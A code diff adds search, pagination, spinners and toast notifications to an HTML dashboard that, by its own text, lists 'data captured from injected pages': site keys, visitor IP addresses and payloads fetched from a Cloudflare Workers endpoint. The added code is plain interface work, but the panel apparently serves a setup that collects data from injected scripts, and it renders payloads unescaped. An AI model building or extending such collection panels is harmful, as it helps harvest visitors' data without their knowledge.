@@ -18,6 +18,32 @@
         .empty { text-align: center; color: #888; padding: 40px; }
         .timestamp { color: #666; font-size: 0.9em; white-space: nowrap; }
     </style>
+
+<style>
+/* Spinner */
+.spinner {
+    border: 2px solid rgba(255, 255, 255, 0.1);
+    border-left-color: #ffffff;
+    border-radius: 50%;
+    width: 16px;
+    height: 16px;
+    animation: spin 1s linear infinite;
+    display: inline-block;
+    vertical-align: middle;
+    margin-right: 8px;
+}
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+/* Skeleton */
+.skeleton {
+    background: linear-gradient(90deg, rgba(255,255,255,0.05) 25%, rgba(255,255,255,0.1) 50%, rgba(255,255,255,0.05) 75%);
+    background-size: 200% 100%;
+    animation: skeleton-loading 1.5s infinite;
+    border-radius: 4px;
+}
+@keyframes skeleton-loading { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
+</style>
+
 </head>
 <body>
     <div class="container">
@@ -28,6 +54,16 @@
         <p>Real-time data captured from injected pages.</p>
 
         <div id="loading">Loading data...</div>
+
+        <div style="margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center;">
+            <input type="text" id="capture-search" placeholder="Search captures..." style="padding: 10px; width: 100%; max-width: 400px; border-radius: 6px; border: 1px solid #ddd;">
+            <div>
+                <button id="prev-page" style="padding: 8px 12px; background: #eee; border: 1px solid #ddd; cursor: pointer; border-radius: 4px;">&laquo; Prev</button>
+                <span id="page-info" style="margin: 0 10px; font-weight: bold;">Page 1</span>
+                <button id="next-page" style="padding: 8px 12px; background: #eee; border: 1px solid #ddd; cursor: pointer; border-radius: 4px;">Next &raquo;</button>
+            </div>
+        </div>
+
         <table id="data-table" style="display:none;">
             <thead>
                 <tr>
@@ -42,6 +78,62 @@
 
     <script>
         const WORKER_URL = 'https://calm-bread-1d99.testdx24.workers.dev';
+
+
+        let allCaptures = [];
+        let filteredCaptures = [];
+        let currentPage = 1;
+        const itemsPerPage = 20;
+
+        function renderTable() {
+            const tbody = document.getElementById('table-body');
+            tbody.innerHTML = '';
+
+            const start = (currentPage - 1) * itemsPerPage;
+            const end = start + itemsPerPage;
+            const pageData = filteredCaptures.slice(start, end);
+
+            if (filteredCaptures.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="5" class="empty">No captured data found.</td></tr>`;
+                document.getElementById('page-info').innerText = 'Page 1 of 1';
+                return;
+            }
+
+            const totalPages = Math.ceil(filteredCaptures.length / itemsPerPage) || 1;
+            document.getElementById('page-info').innerText = `Page ${currentPage} of ${totalPages}`;
+
+            pageData.forEach(cap => {
+                const tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td><code>${cap.siteKey}</code></td>
+                    <td><code>${cap.captureId || 'N/A'}</code></td>
+                    <td><div class="timestamp">${new Date(cap.timestamp).toLocaleString()}</div></td>
+                    <td>${cap.ip}</td>
+                    <td><pre>${JSON.stringify(cap.payload, null, 2)}</pre></td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+
+        document.getElementById('capture-search').addEventListener('input', function(e) {
+            const term = e.target.value.toLowerCase();
+            filteredCaptures = allCaptures.filter(cap => {
+                const searchStr = JSON.stringify(cap).toLowerCase();
+                return searchStr.includes(term);
+            });
+            currentPage = 1;
+            renderTable();
+        });
+
+        document.getElementById('prev-page').addEventListener('click', () => {
+            if (currentPage > 1) { currentPage--; renderTable(); }
+        });
+
+        document.getElementById('next-page').addEventListener('click', () => {
+            const totalPages = Math.ceil(filteredCaptures.length / itemsPerPage);
+            if (currentPage < totalPages) { currentPage++; renderTable(); }
+        });
+
 
         async function loadData() {
             try {
@@ -111,5 +203,72 @@
         // Refresh every 30 seconds
         setInterval(loadData, 30000);
     </script>
+
+<style>
+/* Toast Container */
+#toast-container {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    z-index: 9999;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+}
+
+/* Toast Element */
+.custom-toast {
+    background: rgba(17, 17, 17, 0.9);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    color: white;
+    padding: 16px 24px;
+    border-radius: 8px;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+    font-family: 'Inter', sans-serif;
+    font-size: 14px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    opacity: 0;
+    transform: translateX(100%);
+    transition: opacity 0.3s ease, transform 0.3s ease;
+}
+
+.custom-toast.show {
+    opacity: 1;
+    transform: translateX(0);
+}
+
+.custom-toast.success { border-left: 4px solid #17c964; }
+.custom-toast.error { border-left: 4px solid #f31260; }
+.custom-toast.warning { border-left: 4px solid #f5a524; }
+</style>
+<div id="toast-container"></div>
+<script>
+function showToast(message, type = 'success') {
+    const container = document.getElementById('toast-container');
+    const toast = document.createElement('div');
+    toast.className = `custom-toast ${type}`;
+
+    let icon = '✅';
+    if(type === 'error') icon = '❌';
+    if(type === 'warning') icon = '⚠️';
+
+    toast.innerHTML = `<span>${icon}</span> <span>${message}</span>`;
+    container.appendChild(toast);
+
+    setTimeout(() => {
+        toast.classList.add('show');
+    }, 10);
+
+    setTimeout(() => {
+        toast.classList.remove('show');
+        setTimeout(() => toast.remove(), 300);
+    }, 3000);
+}
+</script>
+
 </body>
 </html>
